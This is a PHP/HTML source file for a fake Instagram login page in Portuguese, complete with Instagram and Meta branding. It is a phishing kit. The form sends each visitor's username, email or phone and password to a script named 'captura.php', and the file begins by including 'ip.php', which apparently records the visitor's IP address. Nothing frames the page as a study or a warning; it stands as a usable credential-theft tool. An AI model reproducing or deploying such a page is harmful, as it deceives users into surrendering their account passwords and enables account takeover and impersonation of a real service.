<?php
include "ip.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="assets/css/estilo.css">
  <title>Entrar • Instagram</title>
</head>
<body onLoad="slide()">
  
  <div id="main">
    <div id="container-lang">
      <div id="card-menu">
        <i class="fa-solid fa-ellipsis"></i>
      </div>
      <select name="linguagens" id="lang">
        <option value="">Português (Portugal)</option>
        <option value="">Português (Brasil)</option>
        <option value="">Español</option>
        <option value="">Intaliano</option>
        <option value="">Français</option>
      </select>
    </div>
    <div id="container">
      <div id="card-destaque">
        <div id="card-image">
          <img src="assets/img/celular2.png" alt="">
          <img id="image" src="assets/img/celular2.png" alt="">
        </div>
      </div>
      <div id="card-form-container">
        <div id="card-form">
          <form action="src/captura.php" id="formulario" method="POST">
            <img src="assets/img/Instagram.png" alt="">
            <a href=""><i class="fa-brands fa-square-facebook"></i> Continuar com o facebook</a>
            <span>ou</span>
            <input type="text" name="input-email-usuario-telefone" placeholder="Telefone, nome de usuário ou email"/>
      
            <div id="groupInputPass">
              <input data-input type="password" name="input-senha" placeholder="Senha"/>
            
              <i data-icone class="fa-solid fa-eye"></i>
            </div>
            <a href="">Esqueceu a senha?</a>
            <button data-btn id="btn-entrar">Entrar</button>
            <span id="barra">OU</span>
            <a href=""><i class="fa-brands fa-square-facebook"></i> Entrar com o facebook</a>
            <a href="">Esqueceu a senha?</a>
          </form>
          <div id="card-text">
            <p>Não tem uma conta? <a href="">Cadastre-se</a></p>
          </div>
        </div>
        
        <div id="card-text-app">
          <p>Obtenha o aplicativo</p>
        </div>
        
        <div id="card-image-app">
          <img src="assets/img/appstory.png" alt="">
          <img src="assets/img/playstore.png" alt="">
        </div>
      </div>
    </div> <!--CONTAINER-->
  </div> <!--MAIN FIM-->
  
  <footer>
      <p><span>from</span><br> <i class="fa-brands fa-meta"></i> Meta</p>
    <div>
      <ul>
        <li><a href="">Meta</a></li>
        <li><a href="">Sobre</a></li>
        <li><a href="">Blog</a></li>
        <li><a href="">Carreiras</a></li>
        <li><a href="">Ajuda</a></li>
        <li><a href="">API</a></li>
        <li><a href="">Privacidade</a></li>
        <li><a href="">Termos</a></li>
        <li><a href="">Principais contas</a></li>
        <li><a href="">Hashtags</a></li>
        <li><a href="">Localizações</a></li>
        <li><a href="">Instagram Lite</a></li>
        <li><a href="">Carregamento de contactos e não utilizadores</a></li>
        <li><a href="">Dança</a></li>
        <li><a href="">Comida e bebida</a></li>
        <li><a href="">Casa e jardim</a></li>
        <li><a href="">Música</a></li>
        <li><a href="">Artes visuais</a></li>
      </ul>
      
      <div id="copy">
        <select name="" id="lang-footer">
          <option value="">Português (Brasil)</option>
        </select>
      
        <p>&copy; <?= date("Y");?> Instagram from Meta</p>
      </div>
    </div>
  </footer>
  
  <script src="https://kit.fontawesome.com/a8ba3574d4.js" crossorigin="anonymous"></script>
  <script src="assets/js/script.js"></script>
</body>
</html>
